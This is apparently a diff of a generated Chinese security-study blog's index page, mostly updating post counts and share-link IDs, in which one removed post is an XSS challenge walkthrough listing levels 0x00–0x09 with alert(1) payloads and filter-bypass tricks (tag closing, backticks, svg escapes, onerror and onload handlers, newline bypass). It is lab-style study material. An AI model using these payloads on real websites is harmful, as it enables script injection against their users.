@@ -46,7 +46,7 @@
     <h2 class="author">给我坐下犬夜叉</h2>
     <h3 class="description">啊咧咧</h3>
     <div class="count-box">
-      <a href="/archives"><div><strong>5</strong><br>文章</div></a>
+      <a href="/archives"><div><strong>4</strong><br>文章</div></a>
       <a href="/categories"><div><strong>0</strong><br>分类</div></a>
       <a href="/tags"><div><strong>0</strong><br>标签</div></a>
     </div>
@@ -115,74 +115,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://sovegetable.github.io/2020/09/15/uploadlabs%E9%A2%98%E8%A7%A3/" data-id="ckf3s3t9l0001qotfdw5sfh81" class="article-share-link">分享</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-
-  
-    <article id="post-xss小闯关" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2020/09/15/xss%E5%B0%8F%E9%97%AF%E5%85%B3/" class="article-date">
-  <time class="post-time" datetime="2020-09-15T09:49:04.644Z" itemprop="datePublished">
-    <span class="post-month">9月</span><br/>
-    <span class="post-day">15</span>
-  </time>
-</a>
-   
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/09/15/xss%E5%B0%8F%E9%97%AF%E5%85%B3/">xss小闯关</a>
-    </h1>
-  
-
-        <div>
-          
-          
-              
-
-          
-        </div>
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>0x00</p>
-<p>“<script>alert(1)</script>”</p>
-<p>0x01<br>“<script>alert(1)</script>  //普通的闭合”</p>
-<p>0x02<br>””&gt;<script>alert(1)</script>  //用于input类型的闭合“</p>
-<p>0x03</p>
-<p>“<script>alert<code>1</code></script> //用<code>绕过()的过滤 ，注意</code>要紧贴alter”</p>
-<p>0x04</p>
-<p>“”<svg> <script>alert&#x60;1&#x60;</script><br/>过滤了 （） and `      用<svg>标签可以解析 html转义字符””</svg></svg></p>
-<p>0x05<br>“”–!&gt;<script>alert(1)</script><br>–!&gt; 和–&gt;都可以闭合””</p>
-<p>0x06<br>“type=”image” src=”” onerror<br>=alert(1)”</p>
-<p>使用回车过滤正则，onerror报错时触发</p>
-<p>0x07<br>“”&lt;body onload=alert<code>1</code> （有空格）””</p>
-<p>匹配了尖括号&lt;&gt;开头结尾的字符串替换为空.<br>可以通过少输入一个&gt;来绕过正则,但仍然可以执行.<br>onload 事件会在页面或图像加载完成后立即发生。<br>onload 通常用于”” <body>“” 元素，在页面完全载入后(包括图片、css文件等等。)执行脚本代码。</body></p>
-<p>0x08<br>&lt;/style</p>
-<blockquote>
-<p>“”<script>alert(1)</script>“”</p>
-<p>同上换行绕过</p>
-</blockquote>
-<p>0x09<br>“<a href="https://www.segmentfault.com&quot;&gt;" target="_blank" rel="noopener">https://www.segmentfault.com&quot;&gt;</a><script>alert(1)</script><br>先输入网址通过匹配，然后闭合。这里我发现<script>中间是不能有>的否则语句无效。""</p>
-</script></p>
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="https://sovegetable.github.io/2020/09/15/xss%E5%B0%8F%E9%97%AF%E5%85%B3/" data-id="ckf3s3t9m0002qotf0d1qbk5n" class="article-share-link">分享</a>
+      <a data-url="https://sovegetable.github.io/2020/09/15/uploadlabs%E9%A2%98%E8%A7%A3/" data-id="ckf3wozbr00019wtf2cjtbrqf" class="article-share-link">分享</a>
       
       
     </footer>
@@ -245,7 +178,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://sovegetable.github.io/2020/09/15/OSI%E4%B8%83%E5%B1%82%E5%8D%8F%E8%AE%AE/" data-id="ckf3s3t9d0000qotfg1xw7422" class="article-share-link">分享</a>
+      <a data-url="https://sovegetable.github.io/2020/09/15/OSI%E4%B8%83%E5%B1%82%E5%8D%8F%E8%AE%AE/" data-id="ckf3wozbk00009wtfgclx1gtz" class="article-share-link">分享</a>
       
       
     </footer>
@@ -306,7 +239,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://sovegetable.github.io/2020/08/17/sqlilabs%201~6/" data-id="cke78idh10000pgtfg4kg8x1x" class="article-share-link">分享</a>
+      <a data-url="https://sovegetable.github.io/2020/08/17/sqlilabs%201~6/" data-id="ckf3wozbt00029wtfeosddoze" class="article-share-link">分享</a>
       
       
     </footer>
@@ -411,7 +344,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://sovegetable.github.io/2020/07/26/www.umex.co/" data-id="cke78idhh0001pgtf3j7z2mhm" class="article-share-link">分享</a>
+      <a data-url="https://sovegetable.github.io/2020/07/26/www.umex.co/" data-id="ckf3wozbu00039wtfdhlya9vm" class="article-share-link">分享</a>
       
       
     </footer>
@@ -463,7 +396,7 @@
     <h2 class="author">给我坐下犬夜叉</h2>
     <h3 class="description">啊咧咧</h3>
     <div class="count-box">
-      <a href="/archives"><div><strong>5</strong><br>文章</div></a>
+      <a href="/archives"><div><strong>4</strong><br>文章</div></a>
       <a href="/categories"><div><strong>0</strong><br>分类</div></a>
       <a href="/tags"><div><strong>0</strong><br>标签</div></a>
     </div>
